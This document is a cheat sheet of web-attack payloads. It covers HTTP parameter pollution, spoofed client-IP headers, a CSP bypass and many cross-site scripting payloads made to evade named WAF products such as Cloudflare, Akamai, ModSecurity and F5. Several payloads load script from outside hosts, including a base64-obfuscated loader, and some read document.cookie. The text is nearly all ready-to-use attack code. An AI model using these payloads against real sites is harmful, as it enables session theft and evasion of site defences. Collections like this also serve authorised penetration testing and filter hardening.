**Using HTTP Parameter Pollution**
```
http://target.com/something.xxx?a=val1&a=val2
ASP.NET a = val1,val2
ASP a = val1,val2
JSP a = val1
PHP a = val2
```

**Implementing HTTP Headers**
```
X-Forwarded-For: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

**CSP Bypass**
```
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://rhy.xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

**XSS-protection bypass**
[Reference: Browser's XSS Filter Bypass Cheat Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
```
<embed/:script allowscriptaccess=always src=example.com/x.js>
```

**Cloudflare Bypass**
```
<a"/onclick=(confirm)()>click
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>
<--`<img/src=` onerror=confirm``> --!>
```

**Akamai bypass**
```
<d3v/onauxclick=[2].some(confirm)>click
<a href="javascript:pro\u006dpt(document.cookie)">L1k0r</a>
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```

**Generic WAF Bypasses**
```
<!" (without quotes) before: <!<script>alert(1)</script>
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
BLOCKED <body/onload PASSED <body/onpageshow  BLOCKED =alert() PASSED =(alert)()

Notification.requestPermission(x=>{new(Notification)(1)})

<svg/onload=eval(location.hash.slice(1))>#with(document)body.appendChild(createElement('script')).src='//DOMAIN'
[base64 bypass firefox]: #with(document)body.appendChild(createElement(/script/.source)).src=atob(/Ly9icnV0ZWxvZ2ljLmNvbS5ici8y/.source)

[FINAL/src=brutelogic.com.br/2]: <svg/onload=eval(atob(URL.slice(-148)))>#d2l0aChkb2N1bWVudClib2R5LmFwcGVuZENoaWxkKGNyZWF0ZUVsZW1lbnQoL3NjcmlwdC8uc291cmNlKSkuc3JjPWF0b
2IoL0x5OWljblYwWld4dloybGpMbU52YlM1aWNpOHkvLnNvdXJjZSk=
```
[Reference: Avoiding XSS Detection](https://brutelogic.com.br/blog/avoiding-xss-detection/)

**MORE: Bypassing WAFs in Wild**
```
Name: Wordfence
Payload: <a/href=javascript&colon;alert()>click

Name: Barracuda
Payload: <a/href=&#74;ava%0a%0d%09script&colon;alert()>click

Name: Comodo
Payload: <d3v/onauxclick=(((confirm)))``>click

Name: F5
Payload: <d3v/onmouseleave=[2].some(confirm)>click

Name: ModSecurity
Payload: <details/open/ontoggle=alert()>

Name: dotdefender
Payload: <details/open/ontoggle=(confirm)()//
```
